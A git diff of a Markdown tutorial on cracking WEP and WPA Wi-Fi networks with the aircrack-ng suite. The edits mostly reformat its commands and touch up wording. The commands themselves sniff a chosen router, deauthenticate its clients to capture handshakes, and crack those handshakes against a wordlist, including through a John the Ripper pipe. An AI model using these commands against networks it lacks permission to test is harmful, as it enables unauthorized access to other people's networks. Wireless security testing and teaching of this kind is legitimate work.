@@ -18,7 +18,10 @@ When you get yours (should be WEP for this attack), note down ESSID, BSSID and C
 
 Now focus the sniff in your router:
 
-`airodump-ng -a --ivs -w out --channel <channel> --bssid <bssid> mon0`
+```
+airodump-ng -a --ivs -w out --channel <channel> --bssid <bssid> mon0
+```
+
 This will create an `out.cap` file and it will write only interesting packages (ivs).
 
 ## WEP
@@ -108,13 +111,16 @@ besside-ng -W -c <channel> -b <bssid> -vv <interface>
 
 Both commands will create a file wpa.cap where you have executed the command.
 This file will contain only handshakes, so you can crack it once you get it.
+The command will scan the router and try to deauthenticate clients to get the
+handshake, so it will automate the airodump-ng/aireplay-ng commands.
 
 ### Cracking the handshake
 
 Just use `aircrack-ng` for the task:
 
 ```
-aircrack-ng -w <dict-file> <cap-file> # where cap-file is out.cap in first example or wpa.cap in the second
+aircrack-ng -w <dict-file> <cap-file>
+# where cap-file is out.cap in first example or wpa.cap in the second one
 ```
 
 If there are several handshakes of several routers, it will ask which one. You
@@ -123,7 +129,7 @@ can force it at the beginning adding `-b <bssid>` in the aircrack-ng command.
 If you need to be able to pause aircrack-ng and resume it later you'll need to
 make use of `John the Ripper` tool.
 
-You should launch the cracking with this command:
+You should launch the cracking process with this command:
 
 ```
 john --session=wpa --stdout --wordlist=<dict-file> | aircrack-ng -w - -b <bssid> wpa.cap
